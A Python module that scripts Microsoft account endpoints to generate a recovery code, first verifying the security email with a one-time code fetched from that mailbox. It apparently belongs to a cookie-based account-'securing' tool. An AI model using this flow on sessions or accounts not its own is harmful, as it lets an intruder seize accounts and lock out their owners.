from securing.utils.cookies.get_email_code import get_email_code

import urllib.parse
import logging
import httpx
import json
import re

async def generate_code(session: httpx.AsyncClient, apicanary: str,  eni: str) -> dict:

    data = await session.post(
        url = "https://account.live.com/API/Proofs/GenerateRecoveryCode",
        headers = {
            "host": "account.live.com",
            "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.5",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "x-ms-apiVersion": "2",
            "x-ms-apiTransport": "xhr",
            "uiflvr": "1001",
            "scid": "100109",
            "hpgid": "201030",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://account.live.com",
            "Referer": "https://account.live.com/proofs/Manage/additional",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "canary": apicanary
        },
        json = {
            "encryptedNetId": eni,
            "uiflvr": 1001,
            "scid": 100109,
            "hpgid": 201030
        }
    )
    
    response = data.json()
    logging.info(f"Generate Recovery Code response: {response}")

    return response

async def get_recovery_code(session: httpx.AsyncClient, apicanary: str, eni: str):
    # Generates a new recovery code
    response = await generate_code(session, apicanary, eni)

    # Missing alias verification
    if "error" in response and response["error"]["code"] == 500:
        print("[~] - Verifying security email")
        
        security_info = await session.get("https://account.live.com/proofs/Manage/additional")

        canary = re.sub(
            r'\\u([0-9A-Fa-f]{4})',
            lambda match: chr(int(match.group(1), 16)),
            urllib.parse.unquote(
                re.search(
                    r'"apiCanary":"([^"]+)"', 
                    security_info.text
                ).group(1)
            )
        )

        proof = json.loads(re.search(r'"emailProofs":\[(.+?)\]', security_info.text, re.DOTALL).group(1))[0]
        email = proof["displayProofName"].replace("\u0040", "@")

        # Send verify otp
        await session.post(
            url = "https://account.live.com/API/Proofs/SendOtt",
            headers = {
                "Accept": "application/json",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "canary": canary
            },
            json = {
                "actionSpecificNetId": proof["encryptedNetId"],
                "destination": proof["encryptedProofId"],
                "proofId": proof["proofId"],
                "channel": proof["channelType"],
                "proofCountry": proof["encryptedProofCountry"],
                "proofCountryCode": proof["encryptedProofCountryCode"],
                "action": "VerifyProof",
                "uiflvr": 1001,
                "uaid": "a6b40722939b47ad89b76b06578cefe1",
                "scid" : 100109,
                "hpgid": 201030
            }
        )
        code = await get_email_code(email)

        # Verify mail
        await session.post(
            url = "https://account.live.com/API/Proofs/VerifyCode",
            headers = {
                "Accept": "application/json",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "canary": canary
            },
            json = {
                "action": "ProofVerify",
                "destination": proof["encryptedProofId"],
                "code": code,
                "uiflvr": 1001,
                "uaid": "a6b40722939b47ad89b76b06578cefe1",
                "scid" : 100109,
                "hpgid": 201030
            }
        )

        response = await generate_code(session, canary, eni)

    return response["recoveryCode"]